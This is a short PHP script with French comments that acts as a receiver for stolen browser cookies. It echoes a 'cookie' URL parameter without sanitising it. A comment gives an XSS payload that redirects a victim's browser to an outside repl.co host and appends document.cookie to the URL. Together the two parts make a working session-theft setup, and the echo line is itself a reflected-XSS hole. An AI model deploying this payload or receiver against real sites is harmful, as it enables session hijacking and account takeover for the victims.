 <?php
$cookie = $_GET['cookie'] . PHP_EOL; //variable cookie déclaré dans l'adresse d'envoi
//ressemble à https://php-cookie.thabe03.repl.co qui exécute index.php donc ce fichier
echo $cookie;
//<script>document.location="https://php-cookie.thabe03.repl.co/index.php?cookie="+document.cookie;</script>
?>